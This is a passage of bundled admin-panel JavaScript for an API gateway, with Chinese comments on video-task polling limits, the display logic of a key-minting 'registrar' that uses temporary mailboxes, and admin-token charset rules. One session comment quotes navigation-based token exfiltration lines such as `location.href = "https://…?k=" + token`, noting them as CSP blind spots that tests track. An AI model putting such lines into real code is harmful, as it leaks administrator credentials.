{\n  return typeof id === \"string\" && /^[A-Za-z0-9_-]{1,128}$/.test(id);\n}\n\n/**\n * 建任务那次的响应里，可以拿去轮询的那个任务标识。**取不到就是 `null`。**\n *\n * ⚠️ **只认顶层那一格 id，而且它必须过形状判据**（本仓 `tests/contract/media.test.ts` 的\n * 「POST /v1/videos 建任务后返回任务标识」那一格里，上游给的正是这一格）。\n * **取不到时绝不猜**：往下猜的话（比如「随便找一个过得了形状判据的字符串」）\n * 一个 `\"queued\"` 状态值就会被当成任务标识——它完全过得了那条正则——\n * 于是面板会拿着它去轮一个不存在的任务，直到轮满上限。\n * ⇒ 取不到就明说「这次的响应里没有能当任务标识用的那一格」，并把原文摆出来。\n */\nexport function videoTaskIdOf(body) {\n  const o = obj(body);\n  if (o === null) return null;\n  return videoTaskIdOk(o.id) ? o.id : null;\n}\n\n/**\n * 一次轮询请求需要的那几样东西。**构造不出来时返回 `null`。**\n *\n * ⚠️ **`body` 是 `undefined` 而不是 `{}`**：这是一条 GET。`js/gw-api.js` 那边\n * `JSON.stringify(undefined)` 就是 `undefined`，于是 fetch 一个字节的请求体都不带；\n * 给它一个空对象的话，带 body 的 GET 在浏览器里直接抛。\n *\n * ⚠️ **`headerName` 仍然只是头的名字、不含值**（与 `buildRequest()` 同一条结构）：\n * 网关口令由 `js/gw-api.js` 在发请求那一刻现拼，不进这个返回值。\n */\nexport function buildPollRequest(endpoint, taskId, origin) {\n  if (endpoint === null || endpoint === undefined) return null;\n  const slot = typeof endpoint.taskSlot === \"string\" && endpoint.taskSlot !== \"\" ? endpoint.taskSlot : null;\n  if (slot === null) return null;\n  if (!videoTaskIdOk(taskId)) return null;\n  const base = typeof origin === \"string\" ? origin : \"\";\n  // **`split`/`join` 而不是 `replace`**（与 `buildRequest()` 里那条同一理由）。\n  const path = String(endpoint.pathTemplate).split(slot).join(taskId);\n  return {\n    url: `${base}${path}`,\n    method: String(endpoint.method),\n    headerName: String(endpoint.authHeader),\n    body: undefined,\n  };\n}\n\n/**\n * 轮询的两条上限。**手写常量，两条都要有**（护栏 1）。\n *\n * ⚠️⚠️ **「最多轮几次」与「最多轮多久」不是同一条**，缺一条都封不住：\n * · 只有次数上限 ⇒ 间隔被谁改大之后，一个标签页能挂上几个小时；\n * · 只有时长上限 ⇒ 间隔被谁改小之后，同样的时长里打点次数翻几十倍。\n * 两条同时判，**先到哪条算哪条**。\n *\n * ⚠️ **今天这三个值让两条上限在稳态下数学等价，如实登记（评审 L4）**：\n * `60 × 5000 === 300000` ⇒ **一路不间断地轮下去，永远是次数那条先到，时长那条一次都不会触发。**\n * 时长那条**不是冗余**，它在两种情形下才有意义：① 页面被藏起来过（打点暂停但墙钟照走）\n * ⇒ 同样的次数会跨更长的真实时间；② 将来谁改了这三个值中的任何一个而没回头算这道乘法。\n * **别把「它没触发过」读成「它没用」，也别把这条等式读成设计要求**——\n * 它今天成立，`tests/ui/playground-media.test.ts` 的\n * 「三条轮询常量逐条手写字面量」把这道乘法写下来，改了任何一个值那一格都会红。\n *\n * ⚠️ **5 分钟 / 60 次对真实的视频生成可能偏短，登记（评审 L5）**：本仓从来没有量过\n * 真实上游生成一条视频要多久（假上游三拍就给）。偏短的后果是**响的**——面板显示\n * 「轮询已到上限，先停下了」并把任务标识摆着，运维可以稍后自己再查，**不是静默失败**。\n * 真要放宽，改的是这三个常量，别去掉判定。登记 P3e。\n */\nexport const VIDEO_POLL_INTERVAL_MS = 5_000;\nexport const VIDEO_POLL_MAX_ATTEMPTS = 60;\nexport const VIDEO_POLL_MAX_MS = 300_000;\n\n/**\n * 下一步该不该再轮一次。**纯判定，不碰时钟**——时间由调用方量好了传进来。\n *\n * `state`: `{ attempt, elapsedMs }`。`attempt` = **已经轮过几次**（第一次轮之前是 0）。\n *\n * ⚠️⚠️ **必须有上限，而且上限要在这里、不在板块文件里**：一个忘了关的标签页就是一台\n * 永动打点机——每一次打点都是一次**真的**上游请求，烧的是运维自己的配额。\n * 判定写在板块文件里的话它就没有单测，而「轮询会不会停」这件事**在屏幕上要几分钟\n * 才看得出来**，是最不容易被人工冒烟发现的那一类。\n *\n * ⚠️ **到点给的是 `giveUp` 而不是静默停下**：停下来什么都不说的话，屏幕上留下的是\n * 一个永远「进行中」的框。调用方据这一档画出「任务仍在进行，请稍后用任务标识再查」\n * 并把标识摆出来。\n *\n * 由 `tests/ui/playground-media.test.ts` 的\n * 「轮询到达次数上限后停下 —— 无限轮就是一台永动打点机」与\n * 「轮询到达时长上限后停下 —— 只判次数的话把间隔改大就能挂上几个小时」两格钉着。\n */\nexport function videoPollNext(state) {\n  const s = obj(state);\n  const attempt = s !== null && typeof s.attempt === \"number\" && s.attempt >= 0 ? s.attempt : 0;\n  const elapsedMs = s !== null && typeof s.elapsedMs === \"number\" && s.elapsedMs >= 0 ? s.elapsedMs : 0;\n  if (attempt >= VIDEO_POLL_MAX_ATTEMPTS) return { action: \"giveUp\" };\n  if (elapsedMs >= VIDEO_POLL_MAX_MS) return { action: \"giveUp\" };\n  return { action: \"poll\", delayMs: VIDEO_POLL_INTERVAL_MS };\n}\n\n/**\n * 一段响应体的可读形态。**读不出来时是 `null`，不是空串**——空串在屏幕上与\n * 「上游回了一个空响应」长得一样，而那是两件事。\n *\n * ⚠️ **非流式那一档仍然展示响应体原文，这不是遗留、是选择。** Task 10 把它记成\n * 「等真源加了『回答文本在哪』那一格再改成对话气泡」，而 Task 11 加的那一格\n * （`streamTextPath`）**只覆盖流式增量**，它答不了「非流式响应里那句话在哪」\n * ——那是另一条路径上的另一格（openai 在 `choices[0].message.content`、\n * anthropic 在 `content[0].text`、…）。**今天没有第二个消费者要它**，\n * 而这份真源自己就记着「别在那之前预先搬」（见它 `upstreamPath` 上方那段边界）。\n * ⇒ **登记 P3e**，判据与那一条完全相同：出现第二个消费者时再加。\n * 在那之前展示原文——对一个调试工具来说它本来就更有用，而且它不会说假话。\n */\nexport function prettyJson(value) {\n  let out;\n  try {\n    out = JSON.stringify(value, null, 2);\n  } catch (e) {\n    return null;\n  }\n  return typeof out === \"string\" ? out : null;\n}\n", type: "text/javascript; charset=utf-8", etag: "\"5b111553cef02781\"" },
  "/admin/js/pure/registrar.mjs": { body: "/**\n * 注册机板块的**全部取值决策**。板块文件（`js/sec-registrar.js`）只剩 DOM 拼装、\n * 网络调用与 i18n 查表（admin-ui/README.md 硬规则 1）。\n *\n * 这个目录下的文件受三条硬规则约束（禁 import、禁浏览器全局、纯文本校验），\n * 规则全文见 admin-ui/README.md。\n *\n * ⚠️ **本模块承载设计 §10.3「两条通道完全平级」八条规则里的结构性那几条**：\n * 顺序（第 3 条）、两卡同构（第 2 条的取数侧）、唯一的不对称只写事实（第 5 条）。\n * 改动它们之前先看 `tests/ui/registrar.test.ts` 与\n * `tests/ui/dom/registrar-section.test.ts` 里对应的用例。\n */\n\n/**\n * 两条邮箱通道，**顺序固定为字母序**（设计 §10.3 第 3 条）。\n *\n * 理由逐字照抄设计文档，因为它就是这条规则的全部依据：\n * **任何顺序都会被读成排名，字母序是唯一可辩护的中立规则；不用随机化因为会伤肌肉记忆。**\n *\n * 后端 `GET /admin/api/registrar/status` 的 `channels` 是一个 JSON 对象，\n * **渲染顺序不从它来**——对象键序是后端写出来的顺序，改后端一行就能悄悄改变\n * 面板上谁排在前面。顺序的唯一真源是这里这一个常量。\n */\nexport const CHANNELS = [\"moemail\", \"yyds\"];\n\n/**\n * 通道名 → i18n key。**两条各写一次字面量**，好让三道 i18n 门禁都扫得到\n *（拼接出来的 key 三道全瞎，见 tests/unit/i18n-dict.test.ts 里那条按命名空间\n * 前缀扫字面量的用例）。\n */\nexport function channelLabelKey(channel) {\n  return channel === \"yyds\" ? \"reg.channel.yyds\" : \"reg.channel.moemail\";\n}\n\n/**\n * **两条通道之间唯一的不对称**，设计 §10.3 第 5 条：YYDS 的 `baseUrl` 有内置取值、\n * MoeMail 没有（代码依据：`src/core/registrar/config.ts` 的 `DEFAULTS.yydsBaseUrl`\n * 存在，而 MoeMail 那条在 `creds()` 里是「两项都必须显式提供」）。\n *\n * ⚠️⚠️ **这条不许写成「YYDS 开箱即用」——那是偏好，不是事实。** 要写成事实：\n * 一条是**地址固定的公共服务**，一条是**自建服务、每个实例地址都不同**。\n *\n * ⚠️⚠️ **措辞里绝不能出现「默认」两个字，尽管设计 §10.3 第 5 条给的原句正是\n * 「本就不存在默认地址」。** 那句话会被 §10.3 第 4 条自己的禁用词门禁\n *（`scripts/check-i18n.mjs` 第 ⑥ 条，`reg.*` 命名空间）当场拦下——「默认」就在\n * 禁用词表里。设计文档这两条互相打架，本任务按第 4 条（它是 CI 门禁）执行，\n * 把第 5 条的语义原样保住、换一个不含禁用词的说法。\n */\nexport function channelAddressFactKey(channel) {\n  return channel === \"yyds\" ? \"reg.channel.addressFact.yyds\" : \"reg.channel.addressFact.moemail\";\n}\n\n/**\n * 这条通道在**本次配置**里的角色 → i18n key。\n * `null`（既不是主也不是备）同样有一句如实的文案，**不是留空**——空着会让运维\n * 以为是没读出来。\n */\nexport function channelRoleKey(role) {\n  if (role === \"primary\") return \"reg.role.primary\";\n  if (role === \"fallback\") return \"reg.role.fallback\";\n  return \"reg.role.unused\";\n}\n\n/**\n * 补池失败归因 → i18n key。**十二个成员逐条列出，表外的一律返回 `null`。**\n *\n * ⚠️⚠️ **设计 §7.3 要的「`switch` + `never` 穷尽检查」在这个文件里做不到，这是\n * 一条如实登记的偏离，不是疏忽。** `admin-ui/js/pure/*.mjs` 是 JavaScript，而\n * `tsconfig.json` 只开了 `allowJs`、**没有开 `checkJs`**（那一行旁边写着理由：\n * 「那些 .mjs 由 tests/ui 的行为断言守着，不做类型检查」）⇒ 无论这里怎么写，\n * `tsc --noEmit` 都不会看它一眼，`never` 在这里是一句注释而不是一道检查。\n *\n * **穷尽性因此落在两处会真的变红的地方，两处方向相反：**\n * ① `tests/ui/registrar.test.ts` 的\n *    「失败归因表就是 TEND_FAILURE_REASONS 那一份——加了第 13 个成员，这一格会 tsc 报错」\n *    里那张 `Record<TendFailureReason, string>` 手写表：**联合类型多一个成员，\n *    `tsc` 当场报错**（那个文件在 `tsconfig.json` 的 include 里）；\n * ② `tests/unit/i18n-dict.test.ts` 的「TendFailureReason 的每个成员都有 reg.fail.<reason> 键」：\n *    少一条五语言文案就变红。\n *\n * **表外返回 `null` 而不是一句「未知」**：`null` 让调用方有机会**把那个 reason 原样\n * 显示出来**（`reg.fail.unknownReason`），而一句写死的「未知」会把一条本来能被\n * 运维 grep 到的线索抹掉。\n */\nexport function failureReasonKey(reason) {\n  switch (reason) {\n    case \"domain_blocked_all\": return \"reg.fail.domain_blocked_all\";\n    case \"upstream_error\": return \"reg.fail.upstream_error\";\n    case \"code_timeout\": return \"reg.fail.code_timeout\";\n    case \"register_failed\": return \"reg.fail.register_failed\";\n    case \"login_failed\": return \"reg.fail.login_failed\";\n    case \"key_failed\": return \"reg.fail.key_failed\";\n    case \"provider_error\": return \"reg.fail.provider_error\";\n    case \"network_error\": return \"reg.fail.network_error\";\n    case \"rate_limited\": return \"reg.fail.rate_limited\";\n    case \"provider_missing\": return \"reg.fail.provider_missing\";\n    case \"round_crashed\": return \"reg.fail.round_crashed\";\n    case \"key_suspicious\": return \"reg.fail.key_suspicious\";\n    default: return null;\n  }\n}\n\n/**\n * 后端拒绝时那个**顶层 `reason`** → i18n key。\n *\n * ⚠️⚠️ **状态码不是判据。** `409` 有三种（`tend_in_flight` / `locked` /\n * `registrar_disabled`）、**`429` 有四种**（`manual_cooldown` / `write_budget_exhausted` /\n * `probe_in_flight` / `probe_cooldown`——后两种是 P3d Task 8 的出站探测护栏加的）。\n * 拿状态码选文案的前端会把「另一个副本在跑」（等对面跑完）与「注册机压根没开」\n *（去设置里打开它）说成同一句话——两者的处置毫无共同之处。\n * 这与 Key 池那条 `must_disable_first` 在批量路径上「200 一路走过去」是同一个形状。\n *\n * 表外返回 `null`：调用方退回到一句通用的失败提示，**绝不冒充任何一档已知原因**。\n */\nexport function refuseReasonKey(reason) {\n  switch (reason) {\n    case \"tend_in_flight\": return \"reg.refuse.tend_in_flight\";\n    case \"locked\": return \"reg.refuse.locked\";\n    case \"registrar_disabled\": return \"reg.refuse.registrar_disabled\";\n    case \"write_budget_exhausted\": return \"reg.refuse.write_budget_exhausted\";\n    case \"manual_cooldown\": return \"reg.refuse.manual_cooldown\";\n    case \"not_wired\": return \"reg.refuse.not_wired\";\n    case \"unknown_channel\": return \"reg.refuse.unknown_channel\";\n    case \"channel_not_configured\": return \"reg.refuse.channel_not_configured\";\n    // 出站探测护栏的两种（P3d Task 8）。**两条都必须在这张表里**：漏了的话\n    // `refuseReasonKey` 返回 null，调用方退回通用的 `reg.channel.testError`，\n    // 于是「刚测过，隔几秒再来」与「这条通道真的连不上」在面板上长得一模一样——\n    // 而运维恰恰会在失败之后立刻重试，也就是必然撞上这一格。\n    // 两句文案的处置完全不同（等上一次回来 / 隔几秒再来），所以是两条键不是一条。\n    case \"probe_in_flight\": return \"reg.refuse.probe_in_flight\";\n    case \"probe_cooldown\": return \"reg.refuse.probe_cooldown\";\n    default: return null;\n  }\n}\n\n/** 有限数字才算数，别的（含 `null` / 字符串 / NaN）一律 `null`。**绝不伪造 0。** */\nfunction finite(v) {\n  return typeof v === \"number\" && Number.isFinite(v) ? v : null;\n}\n\nfunction obj(v) {\n  return v !== null && typeof v === \"object\" && !Array.isArray(v) ? v : null;\n}\n\n/**\n * 注册机的启用状态与两条通道的角色。\n * 整段读不到时逐字段 `null`——**「注册机关着」与「没读到」必须分得开**，\n * 前者渲染成「已关闭」，后者渲染成 `—`。\n */\nexport function statusView(body) {\n  const b = obj(body);\n  return {\n    enabled: b !== null && typeof b.enabled === \"boolean\" ? b.enabled : null,\n    primary: b !== null && typeof b.primary === \"string\" ? b.primary : null,\n    fallback: b !== null && typeof b.fallback === \"string\" ? b.fallback : null,\n    serverTime: b === null ? null : finite(b.serverTime),\n    lockedUntil: b === null ? null : finite(b.lockedUntil),\n  };\n}\n\n/**\n * 两张通道卡的取数，**顺序恒为 `CHANNELS`**。\n *\n * **一定返回两项**，读不到就把 `configured` 记成 `null`（不是 `false`）：\n * 「这条通道没配」与「读不出来」在面板上是两句不同的话，而把后者显示成前者，\n * 运维会去配一条其实已经配好的通道。\n */\nexport function channelCards(body) {\n  const b = obj(body);\n  const all = b === null ? null : obj(b.channels);\n  return CHANNELS.map((channel) => {\n    const one = all === null ? null : obj(all[channel]);\n    return {\n      channel,\n      configured: one !== null && typeof one.configured === \"boolean\" ? one.configured : null,\n      role: one !== null && typeof one.role === \"string\" ? one.role : null,\n    };\n  });\n}\n\n/**\n * 池子那一行的四个数字。\n *\n * ⚠️ **`counted` 不是「可用」**：判据是 `countsTowardTarget`（`!evicted`），\n * **被停用的与正在冷却的 key 都算在里面**，而这两种都不能打上游。真正的可用数是\n * 另一格 `fresh`。两格并排显示、各自的标签各说各的口径——这是\n * `src/core/registrar/tender.ts` 里那段「这一栏不许按『可用』渲染」的落点。\n */\nexport function poolView(body) {\n  const b = obj(body);\n  const p = b === null ? null : obj(b.pool);\n  return {\n    target: p === null ? null : finite(p.target),\n    counted: p === null ? null : finite(p.counted),\n    gap: p === null ? null : finite(p.gap),\n    fresh: p === null ? null : finite(p.fresh),\n    mintBatch: p === null ? null : finite(p.mintBatch),\n  };\n}\n\n/**\n * 确认弹窗要明示的消耗（设计 §10.2 第 3 条护栏）：本次最多铸几把 key、\n * 最多消耗几个临时邮箱。\n *\n * 算式与 `tendOnce` 逐字相同：`rounds = min(need, mintBatch)`，`need = target - counted`\n *（后端已经把 `need` 夹到非负后叫 `gap`）。一次尝试最多建一个临时邮箱，所以两个数相等。\n *\n * ⚠️ **两个外部服务的活跃邮箱上限（YYDS / MoeMail 各自那个数）一律不写进文案。**\n * 它们一个与账号档位绑定、一个是可被实例覆盖的上游默认值，**把一个当前取值印在\n * 面板上，运维会把它当成自己这套部署的事实**。文案改成指向各自服务商的文档，\n * 完整理由见 `src/http/admin/handlers/registrar.ts` 的文件头。\n *\n * 读不出来时返回 `null` ⇒ 弹窗显示 `—`，**不伪造一个 0**（「最多铸 0 把」会让人\n * 以为点了也没用）。\n */\nexport function tendCost(body) {\n  const p = poolView(body);\n  if (p.gap === null || p.mintBatch === null) return null;\n  const keys = Math.max(0, Math.min(p.gap, p.mintBatch));\n  return { keys, mailboxes: keys };\n}\n\n/**\n * 「今天还剩几次 / 什么时候能再点」。\n *\n * ⚠️ **绝对时刻与相对时长成对取**（评审 m3 定死的口径）：相对量用来做倒计时\n *（免疫客户端时钟偏差），绝对时刻用来显示「几点恢复」。**绝不让面板自己拿本地\n * 时钟去减一个服务端时刻**——两条路在时钟有偏差时会给出两个不一致的答案。\n */\nexport function manualQuotaView(body) {\n  const b = obj(body);\n  const m = b === null ? null : obj(b.manual);\n  return {\n    remaining: m === null ? null : finite(m.remaining),\n    perDay: m === null ? null : finite(m.perDay),\n    resetAt: m === null ? null : finite(m.resetAt),\n    cooldownUntil: m === null ? null : finite(m.cooldownUntil),\n    retryAfterMs: m === null ? null : finite(m.retryAfterMs),\n  };\n}\n\n/**\n * 补池历史，**最新的排在最前面**。\n *\n * 后端存的是环形追加（最新的在数组末尾），面板要倒着看——这一步是取值决策，\n * 所以在这里，不在板块文件里。\n *\n * 每一行都是后端 `narrowTendHistory` 逐字段校验过的，但**这里仍然只收对象**：\n * 一个被中间层改坏的响应体不该让整块历史抛异常消失。\n */\nexport function historyRows(body) {\n  const b = obj(body);\n  const h = b === null ? null : obj(b.history);\n  const entries = h !== null && Array.isArray(h.entries) ? h.entries : [];\n  return entries.filter((r) => obj(r) !== null).slice().reverse();\n}\n\n/** 后端在读补池历史时丢掉了几条读不得的记录。`null` = 整块没读到（不是 0）。 */\nexport function historyMalformed(body) {\n  const b = obj(body);\n  const h = b === null ? null : obj(b.history);\n  return h === null ? null : finite(h.malformed);\n}\n\n/**\n * 一行补池记录的**结果**该说哪句话。\n *\n * 四种形态的判据逐字取自 `src/core/registrar/tender.ts` 里 `mintedByChannel` 上方\n * 那张表：**`skipped` + `attempted` + `failures` 三个字段合读**才分得清，\n * 单看任何一个都不行。别拿 `mintedByChannel` 的空表去推断这一轮发生了什么。\n */\nexport function roundOutcome(row) {\n  const r = obj(row);\n  if (r === null) return { key: \"reg.row.unreadable\", params: {} };\n  if (r.skipped === true) return { key: \"reg.row.skipped\", params: {} };\n  const attempted = finite(r.attempted);\n  const failures = Array.isArray(r.failures) ? r.failures : [];\n  if (attempted === 0 && failures.length === 0) return { key: \"reg.row.healthy\", params: {} };\n  // 一次都没开始、却有失败归因 ⇒ 整轮抛错（`round_crashed`）或者预算装不下第一次尝试。\n  // **不许渲染成「铸出 0/0 把」**：那句话读起来像「跑完了但没产出」，而它其实是\n  // 「根本没跑起来」，两者的排查方向完全不同。\n  if (attempted === 0) return { key: \"reg.row.noAttempt\", params: {} };\n  return {\n    key: \"reg.row.minted\",\n    params: { minted: finite(r.minted) === null ? \"—\" : r.minted, attempted },\n  };\n}\n\n/**\n * 一行里的失败归因列表（逐条带 `channel`）。\n * **表外的 `reason` 不丢掉**：`key` 为 `null` 时调用方原样把 `reason` 显示出来。\n */\nexport function roundFailures(row) {\n  const r = obj(row);\n  const list = r !== null && Array.isArray(r.failures) ? r.failures : [];\n  return list.filter((f) => obj(f) !== null).map((f) => ({\n    reason: typeof f.reason === \"string\" ? f.reason : \"\",\n    channel: typeof f.channel === \"string\" ? f.channel : \"\",\n    key: failureReasonKey(f.reason),\n  }));\n}\n\n/**\n * 逐通道的铸出数，渲染成 `moemail 2 · yyds 1`。\n *\n * ⚠️ **这一格存在的理由是硬约束「两条通道完全平级」**（`TendResult.mintedByChannel`\n * 上那段评审 I8）：`minted` 只有总数，而一轮全靠备通道铸出来时，总数记在哪条通道\n * 名下是看不出来的——没有这一格，备通道的战绩会被持续记到主通道头上。\n *\n * 顺序：先按 `CHANNELS`（字母序），再把表里出现过的其它通道名按字典序接在后面\n *（通道名来自配置，理论上可以是别的东西；丢掉它等于让一份真实产出凭空消失）。\n * 没铸出来的通道**不出现**（后端就是这么记的，补一个 0 是伪造一次产出记录）。\n */\nexport function mintedByChannelText(row) {\n  const r = obj(row);\n  const table = r === null ? null : obj(r.mintedByChannel);\n  if (table === null) return null;\n  const known = CHANNELS.filter((c) => finite(table[c]) !== null);\n  const extra = Object.keys(table)\n    .filter((c) => !CHANNELS.includes(c) && finite(table[c]) !== null)\n    .sort();\n  const parts = [...known, ...extra].map((c) => `${c} ${table[c]}`);\n  return parts.length === 0 ? null : parts.join(\" · \");\n}\n\n/**\n * 一次通道连通性测试的结果该怎么显示。\n *\n * **两条通道用同一个函数、同一套文案模板**（设计 §10.3 第 6 条：两个按钮的样式、\n * 位置、文案模板完全一致）——「等权」在这里是结构上的，不是靠两处代码写得一样。\n *\n * `ok: false` 走的是 HTTP 200 + `{ ok: false }`：**「测出来不通」是这颗按钮要回答的\n * 问题，不是面板自己坏了**，所以它不该长得像一次接口异常。\n */\nexport function channelTestResult(res) {\n  const r = obj(res);\n  if (r === null) return { key: \"reg.channel.testError\", params: {}, kind: \"err\" };\n  const latencyMs = finite(r.latencyMs);\n  if (r.ok === true) {\n    const domains = finite(r.domains);\n    return {\n      key: \"reg.channel.testOk\",\n      params: { domains: domains === null ? \"—\" : domains, latencyMs: latencyMs === null ? \"—\" : latencyMs },\n      kind: \"ok\",\n    };\n  }\n  return {\n    key: \"reg.channel.testFailed\",\n    params: { latencyMs: latencyMs === null ? \"—\" : latencyMs },\n    kind: \"warn\",\n  };\n}\n\n/**\n * 从一次失败的接口调用里取出后端给的顶层 `reason`（`ApiError.body.reason`）。\n * 拿不到就 `null` ⇒ 调用方用一句通用文案，**不猜**。\n */\nexport function refuseKeyOf(errBody) {\n  const b = obj(errBody);\n  return b === null ? null : refuseReasonKey(b.reason);\n}\n", type: "text/javascript; charset=utf-8", etag: "\"461dbbd1ff68d3bc\"" },
  "/admin/js/pure/sendable.mjs": { body: "/**\n * 管理口令的字符集判定。**前后端共用同一份定义**（后端那份是\n * `src/http/admin/auth.ts` 的 `SENDABLE` / `isSendable`），由\n * `tests/ui/sendable-parity.test.ts` 的「逐码位……行为等价」断言钉着。\n *\n * ── 字符集是 `0x20–0x7E`，理由分三段，性质不同，别再混着说 ────────────────\n *\n * 上一版把这三段压成一句「浏览器发不出去的字符」，那句话对其中一段是**假的**，\n * 而它在八处以上被复述。危害不是安全洞（方向仍是 fail closed），是**对运维说了\n * 一句他一试就能证伪的话**——他在浏览器里试一下发现送得出去，然后认定网关在骗人。\n *\n * **(a) 码点 > U+00FF，以及 NUL / LF / CR —— 物理，发生在浏览器。**\n *   `new Headers().set()` 直接抛 `TypeError`（Fetch 规范：头值是 ByteString，\n *   码点 > 255 转不过去；NUL/LF/CR 过不了头值校验）。实测（node v24 的 undici，\n *   与浏览器同一套规范实现）：CJK / emoji / 零宽空格 / NUL / LF / CR 全部 **THROWS**。\n *   这种口令会装出一棵 200 但永远进不去的面板：用户看到「网络错误」，\n *   而服务端**连一条 login_failed 都没有**（请求压根没发出来）。\n *\n * **(b) `0x01–0x08`、`0x0B`、`0x0C`、`0x0E–0x1F`、`0x7F`（共 29 个）—— 物理，\n *   但发生在服务端解析器。**\n *   浏览器**送得出去**（`Headers.set` ACCEPTED），HTTP 解析器才拒：实测\n *   （裸 `http.createServer` + 原始 socket 逐字节注入）一律 **400 Bad Request**。\n *\n *   ⚠️⚠️ **TAB `0x09` 是例外，它不在这一段，落在 (c)。** HTAB 是 RFC 9110 里合法的\n *   field-value 字符：实测 `Headers.set` ACCEPTED、解析器 **200 OK**、\n *   handler 收到 U+0009。**这一条订正的是本注释自己**——上一版写「其余 C0 控制字符\n *   与 0x00–0x1F」，而当时只实测过 BEL / ESC / DEL / NEL 四个：**抽样实测，\n *   却写下范围断言**。现在这三段的边界是**全 256 字节穷举**量出来的。\n *   ⚠️ **workerd 侧没验**，如实标注：这是个双运行时项目，别把 Node 的实测当成两边的答案。\n *\n * **(c) TAB `0x09` 与整段 `0x80–0xFF`（`é` `£` 不间断空格 …）—— 送得出去，也真的能用。\n *   排除它们是我们的稳健性取舍，是口味，不是物理。**\n *   （上一版写「`0x80–0xFF` **可打印**字节」不准确：`0x80–0x9F` 是 C1 控制符、并不可打印，\n *   而它们同样落在这一段。）\n *   实测：浏览器侧 ACCEPTED；Node 解析器侧 **200 OK**，handler 收到的码点与发出的\n *   逐一对应（`0xE9` → U+00E9）；而 `process.env` 里 UTF-8 的 `é` 解出来同样是 U+00E9\n *   ⇒ 两者**逐码点相等**，`ADMIN_TOKEN=\"admin-token-café-0123456789\"` 端到端能用。\n *   （实测同时订正了一处分组：**NEL 0x85 不被 Node 解析器拒**，200 OK 且如实交出\n *   U+0085 —— 它是 C1，结构上属于本段而不是 (b)。）\n *\n *\n *   ⚠️ **TAB `0x09` 与 `0x80–0xFF` 虽然同属 (c)，拦它们的理由并不相同，别混着说**\n *   （刚在 (b) 上栽过一次范围断言，这里不再重蹈）：\n *     · **TAB**：它是**不可见字符**。粘进 `.env` 或 secret 里没人看得见，与\n *       whitespace_padded 挡的是同一类可诊断性问题——只不过首尾空白那条是物理\n *       （传输层会去掉），TAB 这条纯粹是取舍。\n *     · **`0x80–0xFF`**：理由是编码口径，见下面两条。\n *\n *   `0x80–0xFF` 那半为什么还是拦？两条，都写清楚：\n *     · **跨运行时编码口径不一致是真的**：环境变量按 UTF-8 解、HTTP 头值按 Latin-1 解，\n *       两边碰巧在 U+0080–U+00FF 这段对上是**实现细节**，不是规范承诺；\n *       **而 workerd 侧我们没验过**，双运行时项目里未验证的行为差异就是风险。\n *     · RFC 9110 已把 obs-text（0x80–0xFF）标为**弃用**，中间件/反代对它的处置各不相同。\n *   而非 ASCII 口令**不是一个有价值的形态**（它不比同长度的 ASCII 更强），是个坑。\n *\n * ── 与「空格」那条的区别（本轮评审刚裁过，写在这里免得下次又摇摆）─────────\n *\n * 空格 0x20 也曾被排除，理由是「怕复制粘贴出错」——那条**已经被裁掉并放行**了，\n * 因为：空格是**纯 ASCII，跨运行时零编码歧义**，而带空格的 passphrase\n * （`correct horse battery staple`）是**有价值的常见形态**，拒它纯属替运维做主。\n * `0x80–0xFF` 两条都不成立：有真实的编码歧义、又不是有价值的形态。\n * **判据不是「是不是口味」，而是「这个限制换来的稳健性值不值它挡掉的形态」。**\n * (c) 仍然是口味，只是这一次口味的收益 > 代价——所以它被**标成口味**保留，\n * 而不是被伪装成物理。\n *\n * 这个目录下的文件受三条硬规则约束，规则全文见 admin-ui/README.md。\n */\n\n/**\n * 量词是 `*`：这条规则说的是「不含送不出去的字符」，**非空不是它的职责**\n *（后端归 `too_short`，前端归 `gate.empty`，两边各自的上游判断都先把空串接走了）。\n *\n * ⚠️ 上一版前端写 `+`、后端写 `*`，是一处刻意但**多余**的不对称：它让「两边一致」\n * 这句话必须带一个空串的例外，护栏也就只能做到「除了空串以外一致」。\n * 统一成 `*` 之后，等价关系对**全部输入**成立，`sendable-parity` 才能做无例外的\n * 逐码位行为断言。行为没有变化：`app.js` 里 `if (!key)` 仍然先接走空输入。\n */\nconst SENDABLE_RE = /^[\\x20-\\x7e]*$/;\n\n/** 这个字符串能不能被客户端送出去、并被服务端解析器收下。 */\nexport function sendable(s) {\n  return SENDABLE_RE.test(s);\n}\n", type: "text/javascript; charset=utf-8", etag: "\"695992abfc8c94a3\"" },
  "/admin/js/pure/session.mjs": { body: "/**\n * 会话绝对上限的**取值决策**。\n *\n * localStorage 里放的是**原始的 `ADMIN_TOKEN`**，无过期、无登出、产品内无撤销路径\n *（撤销的唯一方式是改 secret 重新部署 / 重建容器，见设计文档 §8.1 规则 2）。\n * 上限管不了「口令已经被偷走」，它管的是**这份 localStorage 值还能被继续用多久**：\n * 一台被别人摸过的运维机器，可用期从「永远」压到「最多 12 小时」。\n *\n * ⚠️ **明说做不到的那一半**：CSP 的 `connect-src 'self'` 挡得住把口令 fetch 出去，\n * `form-action 'none'` 挡得住表单外传，**但挡不住 `location.href = \"https://…?k=\" + token`\n * 这种导航式外传**——CSP 已经没有可用的指令拦它（`navigate-to` 被规范移除了）。\n * 真正的解法是服务端签发可撤销的派生令牌，那要动「ADMIN_TOKEN 只从环境变量读」\n * 这条设计约束，登记 P3c。这段话同时写进了五语言 DEPLOY.md，不只留在注释里。\n * ⚠️⚠️ **上面这句话曾经只是一句话，没有任何机器盯着它点名的那一族**\n *（P3d 全分支评审 F-3，实测：往 `js/sec-playground.js` 里插一行\n * `location.href = \"https://…?k=\" + token`，走完「改文件 → build-ui → 跑全量」之后\n * **十二道门禁一道都不吵**）。⇒ 现在由 `tests/ui/api-session.test.ts` 的\n * 「面板的导航出口清单（CSP 拦不住的那一族）」那一组盯着。\n * ⚠️⚠️ **上一版这里接着写的是「导航出口的处数与位置一变就红」——那是一句全称句，\n * 而它当天就被实测证伪**：换成 `location[\"href\"] = \"https://…?k=\" + token`\n * （方括号 + 字面量属性名，一种完全普通的写法）走完同一条流程，**全量 2716 全绿**。\n * ⇒ 那一族已经补进那张表，而**这句话必须按它真实的形状说**：\n * 那一组盯的是**它认得出的那几种写法**的处数与位置，认不出的那几种\n * **逐条登记在同一个文件的 `NAV_BLIND_SPOTS` 里，并各配一条「确实抓不住」的断言**。\n * ⚠️⚠️ **别把下面这句复述当清单用，那张表才是真源**（上一版这里数着「四类」，\n * 而表里当时是七条 —— 漏掉的三条里就有**真能跳外站**的\n * `const go = location.assign; go(u)`；这段话的两版毛病是同一类：\n * **在散文里另抄一份枚举，抄件迟早比原件短**）。定性上它认不出的是这几种形状：\n * 属性名不是字面量 / 属性名写成模板串 / 